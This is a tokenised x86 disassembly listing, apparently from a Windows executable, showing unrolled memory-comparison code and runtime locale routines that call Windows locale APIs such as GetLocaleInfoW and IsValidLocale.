movzx edi [ esi - 0x4 ]
movzx eax [ edx - 0x4 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1d ]
movzx eax [ edx - 0x1d ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x19 ]
movzx eax [ edx - 0x19 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x15 ]
movzx eax [ edx - 0x15 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x11 ]
movzx eax [ edx - 0x11 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xd ]
movzx eax [ edx - 0xd ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x9 ]
movzx eax [ edx - 0x9 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x5 ]
movzx eax [ edx - 0x5 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1e ]
movzx eax [ edx - 0x1e ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1a ]
movzx eax [ edx - 0x1a ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x16 ]
movzx eax [ edx - 0x16 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x12 ]
movzx eax [ edx - 0x12 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xe ]
movzx eax [ edx - 0xe ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xa ]
movzx eax [ edx - 0xa ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x6 ]
movzx eax [ edx - 0x6 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
jmp r-xdata
mov eax [ esi + 0x8 ]
cmp eax [ edx + 0x8 ]
je r-xdata
movzx edi [ esi + 0x5 ]
movzx eax [ edx + 0x5 ]
sub edi eax
je r-xdata
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi + 0x3 ]
movzx eax [ edx + 0x3 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1a ]
movzx eax [ edx - 0x1a ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x16 ]
movzx eax [ edx - 0x16 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x12 ]
movzx eax [ edx - 0x12 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xe ]
movzx eax [ edx - 0xe ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xa ]
movzx eax [ edx - 0xa ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x6 ]
movzx eax [ edx - 0x6 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x2 ]
movzx eax [ edx - 0x2 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1b ]
movzx eax [ edx - 0x1b ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x17 ]
movzx eax [ edx - 0x17 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x13 ]
movzx eax [ edx - 0x13 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xf ]
movzx eax [ edx - 0xf ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xb ]
movzx eax [ edx - 0xb ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x7 ]
movzx eax [ edx - 0x7 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x3 ]
movzx eax [ edx - 0x3 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1c ]
movzx eax [ edx - 0x1c ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x18 ]
movzx eax [ edx - 0x18 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x14 ]
movzx eax [ edx - 0x14 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x10 ]
movzx eax [ edx - 0x10 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xc ]
movzx eax [ edx - 0xc ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x8 ]
movzx eax [ edx - 0x8 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x4 ]
movzx eax [ edx - 0x4 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1d ]
movzx eax [ edx - 0x1d ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x19 ]
movzx eax [ edx - 0x19 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x15 ]
movzx eax [ edx - 0x15 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x11 ]
movzx eax [ edx - 0x11 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xd ]
movzx eax [ edx - 0xd ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x9 ]
movzx eax [ edx - 0x9 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x5 ]
movzx eax [ edx - 0x5 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx + 0x8 ]
sub edi eax
je r-xdata
movzx edi [ esi + 0x6 ]
movzx eax [ edx + 0x6 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
movzx ecx [ esi - 0x19 ]
movzx eax [ edx - 0x19 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x15 ]
movzx eax [ edx - 0x15 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x11 ]
movzx eax [ edx - 0x11 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0xd ]
movzx eax [ edx - 0xd ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x9 ]
movzx eax [ edx - 0x9 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x5 ]
movzx eax [ edx - 0x5 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x1 ]
movzx eax [ edx - 0x1 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x1a ]
movzx eax [ edx - 0x1a ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x16 ]
movzx eax [ edx - 0x16 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x12 ]
movzx eax [ edx - 0x12 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0xe ]
movzx eax [ edx - 0xe ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0xa ]
movzx eax [ edx - 0xa ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x6 ]
movzx eax [ edx - 0x6 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x2 ]
movzx eax [ edx - 0x2 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x1b ]
movzx eax [ edx - 0x1b ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x17 ]
movzx eax [ edx - 0x17 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x13 ]
movzx eax [ edx - 0x13 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0xf ]
movzx eax [ edx - 0xf ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0xb ]
movzx eax [ edx - 0xb ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x7 ]
movzx eax [ edx - 0x7 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x3 ]
movzx eax [ edx - 0x3 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x1c ]
movzx eax [ edx - 0x1c ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x18 ]
movzx eax [ edx - 0x18 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x14 ]
movzx eax [ edx - 0x14 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x10 ]
movzx eax [ edx - 0x10 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0xc ]
movzx eax [ edx - 0xc ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x8 ]
movzx eax [ edx - 0x8 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x4 ]
movzx eax [ edx - 0x4 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
mov eax [ esi + 0xc ]
cmp eax [ edx + 0xc ]
je r-xdata
movzx edi [ esi + 0x9 ]
movzx eax [ edx + 0x9 ]
sub edi eax
je r-xdata
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi + 0x7 ]
movzx eax [ edx + 0x7 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx + 0xc ]
sub edi eax
je r-xdata
movzx edi [ esi + 0xa ]
movzx eax [ edx + 0xa ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ edx + 0x10 ]
je r-xdata
movzx edi [ esi + 0xd ]
movzx eax [ edx + 0xd ]
sub edi eax
je r-xdata
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi + 0xb ]
movzx eax [ edx + 0xb ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
xor ecx ecx
movzx eax [ edx + 0x10 ]
movzx edi [ esi + 0x10 ]
sub edi eax
je r-xdata
movzx edi [ esi + 0xe ]
movzx eax [ edx + 0xe ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ esi + 0x14 ]
cmp eax [ edx + 0x14 ]
je r-xdata
movzx edi [ esi + 0x11 ]
movzx eax [ edx + 0x11 ]
sub edi eax
je r-xdata
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi + 0xf ]
movzx eax [ edx + 0xf ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx + 0x14 ]
sub edi eax
je r-xdata
movzx edi [ esi + 0x12 ]
movzx eax [ edx + 0x12 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ esi + 0x18 ]
cmp eax [ edx + 0x18 ]
je r-xdata
movzx edi [ esi + 0x15 ]
movzx eax [ edx + 0x15 ]
sub edi eax
je r-xdata
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi + 0x13 ]
movzx eax [ edx + 0x13 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx + 0x18 ]
sub edi eax
je r-xdata
movzx edi [ esi + 0x16 ]
movzx eax [ edx + 0x16 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ esi + 0x1c ]
cmp eax [ edx + 0x1c ]
je r-xdata
movzx edi [ esi + 0x19 ]
movzx eax [ edx + 0x19 ]
sub edi eax
je r-xdata
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi + 0x17 ]
movzx eax [ edx + 0x17 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx + 0x1c ]
sub edi eax
je r-xdata
movzx edi [ esi + 0x1a ]
movzx eax [ edx + 0x1a ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
push 0x20
pop ecx
sub ebx ecx
add esi ecx
add edx ecx
cmp ebx ecx
jae r-xdata
movzx edi [ esi + 0x1d ]
movzx eax [ edx + 0x1d ]
sub edi eax
je r-xdata
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi + 0x1b ]
movzx eax [ edx + 0x1b ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi + 0x1e ]
movzx eax [ edx + 0x1e ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
movzx ecx [ esi + 0x1f ]
movzx eax [ edx + 0x1f ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
sub_429510
push ebp
mov ebp esp
push esi
xor ecx ecx
mov esi 0xe3
pop esi
pop ebp
retn
test edx edx
jns r-xdata
lea ecx [ eax + 0x1 ]
lea esi [ eax - 0x1 ]
jmp r-xdata
lea eax [ esi + ecx ]
cdq
sub eax edx
mov edx [ ebp + 0x8 ]
sar eax 0x1
sub edx [ eax * 8 + r--data ]
je r-xdata
or eax 0xffffffff
cmp ecx esi
jle r-xdata
sub_429545
push ebp
mov ebp esp
push ebx
push esi
push edi
xor edi edi
mov ebx 0xe3
mov eax [ esi * 8 + r--data ]
jns r-xdata
lea edi [ esi + 0x1 ]
lea ebx [ esi - 0x1 ]
jmp r-xdata
lea eax [ ebx + edi ]
cdq
sub eax edx
mov esi eax
sar esi 0x1
push 0x55
push [ esi * 8 + r--data ]
push [ ebp + 0x8 ]
call sub_42975b
add esp 0xc
test eax eax
je r-xdata
or eax 0xffffffff
jmp r-xdata
cmp edi ebx
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_429593
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
test eax eax
je r-xdata
xor eax eax
cmp eax 0x400
je r-xdata
cmp eax 0x800
je r-xdata
cmp [ ebp + 0xc ] 0x0
mov esi [ ebp + 0x10 ]
jne r-xdata
test esi esi
js r-xdata
test esi esi
jg r-xdata
push eax
call sub_429510
pop ecx
test eax eax
js r-xdata
mov ebx [ eax * 8 + r--data ]
push 0x55
push ebx
call sub_42f6f1
pop ecx
pop ecx
mov edi eax
test esi esi
jle r-xdata
lea eax [ edi + 0x1 ]
jmp r-xdata
cmp edi esi
jge r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push ebx
push esi
push [ ebp + 0xc ]
call sub_422868
add esp 0xc
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_42a241
int3
sub_42960f
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call sub_429545
pop ecx
test eax eax
js r-xdata
cmp eax 0xe4
jae r-xdata
mov eax [ eax * 8 + r--data ]
pop ebp
retn
sub_42964d
push ebp
mov ebp esp
mov eax [ rw-data ]
xor eax [ rw-data ]
je r-xdata
mov eax [ ebp + 0x8 ]
push 0x1
push sub_429639
mov [ rw-data ] eax
call [ EnumSystemLocalesW@IAT ]
and [ rw-data ] 0x0
pop ebp
retn
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_42968a
push ebp
mov ebp esp
push [ ebp + 0x14 ]
mov eax [ rw-data ]
xor eax [ rw-data ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
je r-xdata
call sub_42960f
pop ecx
push eax
call [ GetLocaleInfoW@IAT ]
pop ebp
retn
call eax
pop ebp
retn
sub_4296b9
push ebp
mov ebp esp
mov eax [ rw-data ]
xor eax [ rw-data ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
je r-xdata
call [ GetUserDefaultLCID@IAT ]
push eax
call sub_429593
add esp 0xc
pop ebp
retn
call eax
pop ebp
retn
sub_4296e4
push ebp
mov ebp esp
mov eax [ rw-data ]
xor eax [ rw-data ]
je r-xdata
push 0x1
push [ ebp + 0x8 ]
call sub_42960f
pop ecx
push eax
call [ IsValidLocale@IAT ]
pop ebp
retn
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_42970f
push ebp
mov ebp esp
mov eax [ rw-data ]
xor eax [ rw-data ]
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
